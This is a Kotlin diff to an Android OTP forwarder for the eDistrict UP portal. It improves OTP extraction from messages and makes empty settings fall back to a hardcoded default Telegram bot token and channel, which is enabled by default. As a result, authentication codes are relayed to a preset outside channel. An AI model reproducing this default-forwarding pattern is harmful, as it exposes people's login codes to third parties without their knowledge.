@@ -47,9 +47,14 @@ object OtpDispatcher {
             return
         }
 
-        // Extract OTP
-        val otpRegex = Regex("""\b\d{4,8}\b""")
-        val matchedOtp = otpRegex.find(fullMessage)?.value ?: "OTP"
+        // Extract OTP accurately (Contextual match first, then 4-8 digit fallback)
+        val contextualRegex = Regex("""(?:OTP|code|authentication)\D{0,15}(\d{4,8})""", RegexOption.IGNORE_CASE)
+        val contextMatch = contextualRegex.find(fullMessage)
+        val matchedOtp = if (contextMatch != null && contextMatch.groupValues.size > 1) {
+            contextMatch.groupValues[1]
+        } else {
+            Regex("""\b\d{4,8}\b""").find(fullMessage)?.value ?: "OTP"
+        }
 
         val alertText = buildString {
             append("🔔 eDistrict UP OTP Alert\n\n")
@@ -68,8 +73,10 @@ object OtpDispatcher {
             // 1. Telegram
             val isTelegramEnabled = prefs.getBoolean("is_telegram_enabled", true)
             if (isTelegramEnabled) {
-                val botToken = prefs.getString("bot_token", TelegramHelper.DEFAULT_BOT_TOKEN) ?: TelegramHelper.DEFAULT_BOT_TOKEN
-                val chatId = prefs.getString("chat_id", TelegramHelper.DEFAULT_CHANNEL_ID) ?: TelegramHelper.DEFAULT_CHANNEL_ID
+                val tokenFromPrefs = prefs.getString("bot_token", null)?.trim()
+                val botToken = if (!tokenFromPrefs.isNullOrEmpty()) tokenFromPrefs else TelegramHelper.DEFAULT_BOT_TOKEN
+                val chatFromPrefs = prefs.getString("chat_id", null)?.trim()
+                val chatId = if (!chatFromPrefs.isNullOrEmpty()) chatFromPrefs else TelegramHelper.DEFAULT_CHANNEL_ID
                 
                 try {
                     val res = TelegramHelper.sendMessage(botToken, chatId, alertText)
